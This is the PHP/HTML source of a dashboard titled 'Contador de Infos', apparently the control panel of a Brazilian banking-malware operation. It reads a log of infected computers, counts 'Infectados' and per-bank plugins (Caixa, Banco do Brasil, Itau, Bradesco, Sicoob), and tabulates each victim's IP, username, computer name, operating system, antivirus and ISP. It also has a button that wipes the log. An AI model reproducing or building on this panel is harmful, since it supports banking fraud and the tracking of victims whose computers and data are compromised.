

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Contador de Infos</title>
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
    <link rel="stylesheet" href="plugins/morris/morris.css">
    <link rel="stylesheet" href="dist/css/AdminLTE.min.css">
    <link rel="stylesheet" href="plugins/datatables/dataTables.bootstrap.css">
    <link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

    <style type="text/css">
        .info-box-number {
            font-size: 35px !important;
        }
        .no-sort::after { display: none!important; }

        .no-sort { pointer-events: none!important; cursor: default!important; }
    </style>

    <!-- jQuery 2.2.0 -->
    <script src="plugins/jQuery/jQuery-2.2.0.min.js"></script>
</head>
<body class="hold-transition skin-blue layout-top-nav">
<div class="wrapper">

    <header class="main-header">
        <nav class="navbar navbar-static-top">
            <div class="container">
                <div class="navbar-header">
                    <a href="index.php" class="navbar-brand"><b>Infos</b>Contador</a>
                </div>

                <!-- Collect the nav links, forms, and other content for toggling -->
                <div class="collapse navbar-collapse pull-left" id="navbar-collapse">
                    <ul class="nav navbar-nav">
                   
                    </ul>
                </div>
                <!-- /.navbar-collapse -->
            </div>
            <!-- /.container-fluid -->
        </nav>
    </header>
    <style type="text/css">
        tbody td {
            text-align: center;
        }
    </style>

    <!-- Full Width Column -->
    <div class="content-wrapper">
        <div class="container">
            <section class="content-header">

            </section>

            <!-- Main content -->
            <section class="content">

                <div class="row">
                    <div class="col-md-12">

                      <?php

error_reporting(0);

?>





<?php

if(isset($_POST[apagando])){

			$fp = fopen("newconta.txt", "r+");
				ftruncate($fp, 0);
					fclose($fp);
echo("<meta http-equiv='refresh' content='1'>"); //Refresh by HTTP META
echo "CONTADOR ZERADO COM SUCESSO!"; 


  }


?>

<?php  
error_reporting(0);
			
			$GB = 0; $APPITA = 0;  $Brasil=0; $Itau =0; $Caixa =0; $Trusteer=0; $Bradesco  =0;   $APPBRAD =0; $SICOOB =0; $BBT=0; $Sicred =0; $BBcert=0; $BNB=0;
			
				$filename ="newconta.txt"; 
			$lines = file ($filename, FILE_TEXT);  
			foreach ($lines as $line_num => $line) { 
				$d = explode('|',$line);
				$ar = explode ( 'V.' , $d[2]);
						  
				if (trim($d[6])<>''){ $GB++;}
				if (strpos($d[6], "APP-ITA") !== false) {  $APPITA++;}
				if (strpos($d[6], "Brasil") !== false) {  $Brasil++;}
				if (strpos($d[6], "Itau") !== false) {  $Itau++;}
				if (strpos($d[6], "Caixa") !== false) {  $Caixa++;}
				if (strpos($d[6], "Trusteer") !== false) {  $Trusteer++;}
				if (strpos($d[6], "Bradesco") !== false) {  $Bradesco++;}
				if (strpos($d[6], "APP-BRAD") !== false) {  $APPBRAD++;}
				if (strpos($d[6], "BBT") !== false) {  $BBT++;}
				if (strpos($d[6], "Sicred") !== false) {  $Sicred++;}
				if (strpos($d[6], "SICOOB") !== false) {  $SICOOB++;}
				if (strpos($d[6], "BB Cert.") !== false) {  $BBcert++;}
				if (strpos($d[6], "BNB") !== false) {  $BNB++;}
				if (strpos($d[6], "Amazonas") !== false) {  $Amazonas++;}
				if (strpos($d[6], "Brasilia") !== false) {  $Brasilia++;}
				if (strpos($d[6], "Safra") !== false) {  $Safra++;}
			
			?>	

			
			<?php } ?>	



<html>
<body>



      <!-- Content Header (Page header) -->
        <section class="content-header">
          <h1>
            Painel Infos - 2018
            <small>Version 5.1</small>
          </h1>
          <ol class="breadcrumb">
            <li><a href="#"><i class="fa fa-dashboard"></i> Seja bem vido</a></li>
   
          </ol>
        </section>

        <!-- Main content -->
        <section class="content">
          <!-- Info boxes -->
          <div class="row">

      
     
<?php $contafinal = $lines; ?>
<?php  $porc = ( $GB / count($lines) ) * 100; ?>

<div class="row">
            <div class="col-lg-3 col-xs-6">
              <!-- small box -->
              <div class="small-box bg-aqua">
                <div class="inner">
                  <h3>V 80</h3>
                  <p>Ultima vers&atilde;o</p>
                </div>
                <div class="icon">
                  <i class="ion-ios-game-controller-b"></i>
                </div>
              </div>
            </div><!-- ./col -->
            <div class="col-lg-3 col-xs-6">
              <!-- small box -->
              <div class="small-box bg-green">
                <div class="inner">
                  <h3> <?php echo ceil($porc);?><sup style="font-size: 20px">%</sup></h3>
                  <p>Pc com Plugin</p>
                </div>
                <div class="icon">
                <i class="ion ion-stats-bars"></i></div>
              </div>
            </div><!-- ./col -->
            <div class="col-lg-3 col-xs-6">
              <!-- small box -->
              <div class="small-box bg-yellow">
                <div class="inner">
                  <h3><?php echo $GB ?></h3>
                  <p>Total de Plugins</p>
                </div>
                <div class="icon">
                  <i class="ion ion-person-add"></i>
                </div>
              </div>
            </div><!-- ./col -->
            <div class="col-lg-3 col-xs-6">
              <!-- small box -->
              <div class="small-box bg-red">
                <div class="inner">
                  <h3><?php echo count($lines) ?></h3>
                  <p>Total de Infectados</p>
                </div>
                <div class="icon">
                  <i class="ion ion-pie-graph"></i>
                </div>
              </div>
            </div><!-- ./col -->
          </div>

<?php $reset = $lines; ?>

<div class="col-md-4">
              <div class="box box-default">
                <div class="box-header with-border">
                  <h3 class="box-title">Quantidade por Plugin</h3>
                  <div class="box-tools pull-right">
                    <button class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
                    <button class="btn btn-box-tool" data-widget="remove"><i class="fa fa-times"></i></button>
                  </div>
                </div><!-- /.box-header -->
                <!-- /.box-body -->
                <div class="box-footer no-padding">
                  <ul class="nav nav-pills nav-stacked">
                    <li><a href="#"><i class="fa fa-circle-o text-aqua"></i>Caixa Economica<span class="pull-right text-green"> <?php echo $Caixa ?></span></a></li>
                    <li><a href="#"><i class="fa fa-circle-o text-yellow"></i>Banco do Brasil<span class="pull-right text-green"><?php echo $Brasil ?></span></a></li>
                    <li><a href="#"><i class="fa fa-circle-o text-yellow"></i>Banco do Brasil Certificado<span class="pull-right text-green">  <?php echo $BBcert ?></span></a></li>
                        <li><a href="#"><i class="fa fa-circle-o text-light-blue"></i>App Itau<span class="pull-right text-green"> <?php echo $APPITA ?></span></a></li>
          
                        <li><a href="#"><i class="fa fa-circle-o text-light-blue"></i>Banco Itau<span class="pull-right text-green"> <?php echo $Itau ?></span></a></li>
          
                        <li><a href="#"><i class="fa fa-circle-o text-red"></i>Banco Bradesco<span class="pull-right text-green"> <?php echo $Bradesco ?></span></a></li>
          
                        <li><a href="#"><i class="fa fa-circle-o text-red"></i>App Brasdesco<span class="pull-right text-green"> <?php echo $APPBRAD ?></span></a></li>
          
                        <li><a href="#"><i class="fa fa-circle-o text-green"></i>Sicoob<span class="pull-right text-green"> <?php echo $SICOOB ?></span></a></li>


<form  method="post">
<button type="submit" onclick="apagando" name="apagando" class="btn btn-primary">
<i class="ion-trash-a"></i> Zerar Contador
</button>

    </form>

           





                  </ul>

                </div><!-- /.footer -->
              </div><!-- /.box -->
            </div>



            <!-- Main content -->
            <section class="content">

                <div class="row">
                    <div class="navbar-header">

                        <div class="box">
                            <div class="box-body">
                                <table id="list" class="table table-bordered table-hover">
                                    <thead>
                                    <tr>

			<th>Id</th>
			<th>Date</th>
			<th>Vers&atilde;o&nbsp;&nbsp;</th>
			<th>IP</th>
			<th>UserName</th>
			<th>&nbsp;&nbsp;ComputerName</th>
			<th>&nbsp;&nbsp;OS Version</th>
			<th>&nbsp;&nbsp;Plugin(s)</th>
			<th>&nbsp;&nbsp;AV</th>
			<th>&nbsp;&nbsp;ISP</th>

<?php  
error_reporting(0);
			
			$GB = 0; $APPITA = 0;  $Brasil=0; $Itau =0; $Caixa =0; $Trusteer=0; $Bradesco  =0;   $APPBRAD =0; $SICOOB =0; $BBT=0; $Sicred =0; $BBcert=0; $BNB=0;
			
				$filename ="newconta.txt"; 
			$lines = file ($filename, FILE_TEXT);   
			foreach ($lines as $line_num => $line) { 


     $search = explode(",","�,�,�,�,�,�,�,�,�,�,�,�,�,�,�,�,�,�,�,�,�,�,�,�,�,e,i,�,u,�,�,�");
    $replace = explode(",","c,ae,oe,a,e,i,o,u,a,e,i,o,u,a,e,i,o,u,y,a,e,i,o,u,a,e,i,o,u");
   $a = str_replace($search, $replace, $line);


				$d = explode('|',$a);
				$ar = explode ( 'V.' , $d[2]);
						  
				if (trim($d[6])<>''){ $GB++;}
				if (strpos($d[6], "APP-ITA") !== false) {  $APPITA++;}
				if (strpos($d[6], "Brasil") !== false) {  $Brasil++;}
				if (strpos($d[6], "Itau") !== false) {  $Itau++;}
				if (strpos($d[6], "Caixa") !== false) {  $Caixa++;}
				if (strpos($d[6], "Trusteer") !== false) {  $Trusteer++;}
				if (strpos($d[6], "Bradesco") !== false) {  $Bradesco++;}
				if (strpos($d[6], "APP-BRAD") !== false) {  $APPBRAD++;}
				if (strpos($d[6], "BBT") !== false) {  $BBT++;}
				if (strpos($d[6], "Sicred") !== false) {  $Sicred++;}
				if (strpos($d[6], "SICOOB") !== false) {  $SICOOB++;}
				if (strpos($d[6], "BB Cert.") !== false) {  $BBcert++;}
				if (strpos($d[6], "BNB") !== false) {  $BNB++;}
				if (strpos($d[6], "Amazonas") !== false) {  $Amazonas++;}
				if (strpos($d[6], "Brasilia") !== false) {  $Brasilia++;}
				if (strpos($d[6], "Safra") !== false) {  $Safra++;}
			
			?>	
			
			<tr>
				<td><b>	<?php echo $line_num + 1 ?>&nbsp;&nbsp;</b></td>
				<td>	<?php echo $d[0] ?>&nbsp;&nbsp;</td>
				<td><b>	<?php echo $d[1] ?>&nbsp;&nbsp;</b></td>
				<td>	<?php echo $d[7] ?>&nbsp;&nbsp;</td>
				<td><b>	<?php echo $d[3] ?>&nbsp;&nbsp;</b>&nbsp;&nbsp;</td>
				<td>	<?php echo $d[4] ?>&nbsp;&nbsp;</td>
				<td><b>	<?php echo $d[5] ?>&nbsp;&nbsp;</b></font></td>
				<td><b><FONT COLOR="00a65a">	<?php echo $d[6] ?>&nbsp;&nbsp;</b></td>
				<td>	<?php echo $d[10]?>&nbsp;&nbsp;</td>
				<td>	<?php echo $d[9] ?>&nbsp;&nbsp;</td>
			</tr>
			
			
			<?php } ?>			
			

                                    </thead>

                                    <tbody>


                                                                          </tbody>
                                </table>
                            </div>
                        </div>

                    </div>
                </div>

            </section>
            <!-- /.content -->
        </div>
        <!-- /.container -->
    </div>



              </div><!-- /.box -->
            </div><!-- /.col -->
          </div><!-- /.row -->

        </section><!-- /.content -->


<script src="bootstrap/js/bootstrap.min.js"></script>
<script src="plugins/slimScroll/jquery.slimscroll.min.js"></script>
<script src="plugins/fastclick/fastclick.js"></script>
<script src="plugins/datatables/jquery.dataTables.min.js"></script>
<script src="plugins/datatables/dataTables.bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.1.0/raphael-min.js"></script>
<script src="plugins/morris/morris.min.js"></script>
<script src="dist/js/app.min.js"></script>
<script>

function reset(){
  var r = confirm('Deseja Reiniciar a Lista?');
  if (r == true) {
    window.location = "list.php?reset=1";
  }
}

</script>
</body>

</html>
